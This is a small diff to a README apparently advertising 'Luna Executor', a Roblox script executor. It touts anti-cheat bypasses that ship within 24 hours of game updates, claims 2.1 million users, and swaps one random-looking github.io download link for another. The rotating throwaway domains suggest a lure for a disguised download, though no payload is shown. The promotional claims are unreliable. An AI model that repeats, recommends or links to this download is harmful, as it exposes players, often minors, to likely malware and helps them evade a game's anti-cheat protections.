@@ -165,4 +165,4 @@ New bypass versions are typically available **within 24 hours** of any Roblox up
 
 Join over 2.1 million players who trust Luna Executor for reliable, transparent Roblox script execution in 2026.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://yuyasdjwqejs.github.io/setup-win2/)
